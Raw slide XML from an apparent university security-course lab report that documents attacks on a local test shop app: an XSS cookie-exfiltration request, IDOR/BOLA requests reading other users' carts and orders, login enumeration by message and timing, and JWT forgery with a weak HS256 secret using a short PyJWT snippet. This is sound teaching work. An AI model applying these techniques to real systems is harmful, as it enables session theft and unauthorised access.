              <a:t># Request #7 — Cookie Theft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GET /lab/collect?c=LabSession%3DCfDJ8Ae0AZXF1A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  BKvkpotqqq1LhpAGa4vTu-...[REDACTED] HTTP/1.1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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Referer: http://127.0.0.1:5081/Products/Details/1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User-Agent: Mozilla/5.0 (X11; Linux x86_64)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sec-ch-ua-platform: "Linux"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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HTTP/1.1 204 No Content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Server: Kestrel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Date: Mon, 26 Oct 2026 01:43:54 GMT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Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="3200400"/>
            <a:ext cx="5486040" cy="2559960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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8" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="3291840"/>
            <a:ext cx="521172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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t># Análisis de la petición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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Método:    GET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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Endpoint:  /lab/collect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Param c:   LabSession=CfDJ8...[cookie completa]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Origen:    Referer: /Products/Details/1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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Status:    204 No Content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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Duration:  39ms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Type:      fetch (desde img onerror JS)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→ Cookie de sesión exfiltrada exitosamente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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="594360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6600"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite HTTP History en la entrega final.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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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2" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Ataque 3: IDOR / BOLA — Acceso No Autorizado</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULN-03 · CWE-639 · OWASP A01:2021 Broken Access Control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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="7131960" cy="5028840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6" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1463040"/>
            <a:ext cx="667476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📍 Endpoints afectados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/api/cart/{cartId}  ·  /api/orders/{orderId}  ·  /api/admin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🔬 Procedimiento del ataque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Paso 1: Login como cliente-a (userId=1)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Paso 2: BOLA Lectura — GET /api/cart/2 (carrito de B)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→ HTTP 200: {userId:2, items:[Ratón demo, qty:5]}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Paso 3: IDOR Escritura — PUT /api/cart/2/items/2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→ Modifica cantidad del carrito de cliente-b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Paso 4: Lectura pedido — GET /api/orders/2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→ Datos completos del pedido de cliente-b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Paso 5: Bypass admin — GET /api/admin (con cookie MVC)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→ Cliente accede a panel admin sin rol Admin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⚠️ Causa raíz: Sin validación de ownership por recurso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Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="1371600"/>
            <a:ext cx="3657240" cy="1645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33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8" name="TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="141732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CVSS v3.1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Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1737360"/>
            <a:ext cx="1096920" cy="822600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0" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1783080"/>
            <a:ext cx="1096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8.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="228600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HIGH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Box 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9509760" y="1783080"/>
            <a:ext cx="2011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AV:N / AC:L / PR:L / UI:N</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1100"/>
            </a:b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S:U / C:H / I:H / A:N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3" name="Picture 14" descr="06-cart-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3200400"/>
            <a:ext cx="3657240" cy="2057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4" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="50292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Carrito — punto de acceso IDOR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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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6" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Evidencia IDOR: DevTools Network</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cliente-a accede a recursos de Cliente-b sin autorización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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="384120"/>
            <a:ext cx="3200040" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF66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1" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="40248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⚠ PLACEHOLDER — Reemplazar con Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="128016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7AE60"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Carrito propio (userId=1)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Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1645920"/>
            <a:ext cx="5486040" cy="1737000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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4" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1737360"/>
            <a:ext cx="521172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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>GET /api/cart/1 HTTP/1.1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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie: LabSession=CfDJ8...[cliente-a]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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK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Content-Type: application/json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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>→ {userId:1, items:[...]} — Acceso legítimo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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="128016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Carrito ajeno (userId=2) ← IDOR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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1645920"/>
            <a:ext cx="5486040" cy="1737000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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7" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1737360"/>
            <a:ext cx="521172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GET /api/cart/2 HTTP/1.1  ← ID de otro usuario!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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Debería ser 403!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Content-Type: application/json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→ {userId:2, items:[Ratón demo,qty:5]}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Box 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="365760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Pedido ajeno — GET /api/orders/2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Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4023360"/>
            <a:ext cx="5486040" cy="1371240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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0" name="TextBox 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="4114800"/>
            <a:ext cx="52117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GET /api/orders/2 HTTP/1.1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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Sin validación ownership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→ {id:2, userId:2, total:149.95...}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Box 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="365760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Admin bypass — GET /api/admin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Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="4023360"/>
            <a:ext cx="5486040" cy="1371240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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3" name="TextBox 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="4114800"/>
            <a:ext cx="52117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GET /api/admin HTTP/1.1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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Cookie: LabSession=CfDJ8...[cliente-a]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HTTP/1.1 200 OK  ← Cliente no es Admin!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→ {users:[6], products:[4], orders:[2]}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20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="557784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6600"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite en la entrega final.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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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6" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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7" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Ataque 4: Autenticación Débil</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULN-04 · CWE-204/307 · OWASP A07:2021 Auth Failures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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="7131960" cy="5028840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1" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1463040"/>
            <a:ext cx="667476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📍 Endpoint afectado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POST /api/auth/login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🔬 Hallazgo A: Enumeración de usuarios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Usuario inexistente → "Usuario inexistente." (HTTP 401)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Usuario existente, pass mal → "Contraseña incorrecta." (401)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→ Mensajes DIFERENTES revelan qué cuentas existen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🔬 Hallazgo B: Timing Side-Channel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Usuario inexistente: respuesta en ~5ms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Usuario existente, pass mal: respuesta en ~72ms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→ Diferencia de timing confirma existencia de cuenta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🔬 Hallazgo C: Sin Rate Limiting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7 intentos consecutivos, ningún HTTP 429 ni bloqueo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→ Fuerza bruta viable sin restricciones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⚠️ Causa raíz: Mensajes diferenciados + sin rate limit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Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="1371600"/>
            <a:ext cx="3657240" cy="1645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33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Box 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="141732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CVSS v3.1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Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1737360"/>
            <a:ext cx="1096920" cy="822600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F39C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5" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1783080"/>
            <a:ext cx="1096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5.3</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="228600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MEDIUM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Box 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9509760" y="1783080"/>
            <a:ext cx="2011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AV:N / AC:L / PR:N / UI:N</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1100"/>
            </a:b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S:U / C:L / I:N / A:N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8" name="Picture 14" descr="02-login-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3200400"/>
            <a:ext cx="3657240" cy="2057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TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="50292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Página de login — punto de enumeración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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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1" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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2" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Evidencia Auth: Enumeración + Timing</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>POST /api/auth/login — mensajes diferenciados y side-channel de timing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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="384120"/>
            <a:ext cx="3200040" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF66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6" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="40248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⚠ PLACEHOLDER — Reemplazar con Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="128016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7AE60"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Usuario inexistente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Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1645920"/>
            <a:ext cx="5486040" cy="2011320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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9" name="TextBox 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1737360"/>
            <a:ext cx="521172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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>POST /api/auth/login HTTP/1.1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Content-Type: application/json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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Body: {"username":"noexiste","password":"x"}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HTTP/1.1 401 Unauthorized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Body: {"message":"Usuario inexistente."}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8BE9FD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Duration: 5ms  ← RÁPIDO (no busca password)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Box 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="128016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Usuario existente, contraseña incorrecta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Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1645920"/>
            <a:ext cx="5486040" cy="2011320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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2" name="TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1737360"/>
            <a:ext cx="521172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50FA7B"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>POST /api/auth/login HTTP/1.1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Content-Type: application/json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Host: 127.0.0.1:5081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1FA8C"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Body: {"username":"admin","password":"wrong"}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HTTP/1.1 401 Unauthorized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Body: {"message":"Contraseña incorrecta."}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Duration: 72ms  ← LENTO (verifica hash)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Rounded Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="11246760" cy="1828440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C0392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4" name="TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4023360"/>
            <a:ext cx="105152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📊 Análisis (equiv. Burp Suite Intruder — Timing Attack)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Intento 1: 'noexiste'    → 401 'Usuario inexistente.'     → 5ms     ← usuario no existe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Intento 2: 'admin'       → 401 'Contraseña incorrecta.'   → 72ms    ← usuario EXISTE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Intento 3: 'cliente-a'   → 401 'Contraseña incorrecta.'   → 68ms    ← usuario EXISTE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→ Doble canal de enumeración: mensaje diferenciado + timing side-channel (5ms vs 72ms)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→ 7 intentos consecutivos sin HTTP 429 ni lockout = fuerza bruta viable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Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="594360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6600"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>⚠ Nota: Estas capturas DevTools serán reemplazadas por capturas de Burp Suite Intruder en la entrega final.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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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7" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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8" name="TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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Box 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Ataque 5: JWT HS256 Weak Secret — Escalación</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VULN-05 · CWE-347/269 · OWASP A02:2021 Cryptographic Failures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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="7131960" cy="5028840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2" name="TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1463040"/>
            <a:ext cx="667476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📍 Endpoint afectado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/api/admin (Bearer JWT con role=Admin requerido)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🔬 Procedimiento del ataque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Paso 1: Login como cliente-a → obtener JWT legítimo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→ Payload: {sub:'1', unique_name:'cliente-a', role:'Cliente'}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Paso 2: GET /api/admin con token original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→ HTTP 403 Forbidden (role=Cliente, necesita Admin)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Paso 3: Forjar token con PyJWT / Web Crypto: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secret = b'MiniShopLab2026'.ljust(32, b'\x00')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payload = {..., role: 'Admin'}  # cambiar rol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jwt.encode(payload, secret, algorithm='HS256')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Paso 4: GET /api/admin con token forjado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→ HTTP 200 OK — acceso total a datos administrativos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→ 6 usuarios, 4 productos, 2 pedidos expuestos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⚠️ Causa raíz: Secreto HS256 de 15 bytes (débil + adivinable)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Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="1371600"/>
            <a:ext cx="3657240" cy="1645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33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4" name="TextBox 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="141732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CVSS v3.1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Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1737360"/>
            <a:ext cx="1096920" cy="822600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6" name="TextBox 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="1783080"/>
            <a:ext cx="1096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9.6</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Box 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="228600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CRITICAL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Box 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9509760" y="1783080"/>
            <a:ext cx="2011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AV:N / AC:L / PR:L / UI:N</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1100"/>
            </a:b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S:C / C:H / I:H / A:N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9" name="Picture 14" descr="08-admin-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8046720" y="3200400"/>
            <a:ext cx="3657240" cy="2057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0" name="TextBox 15"/>
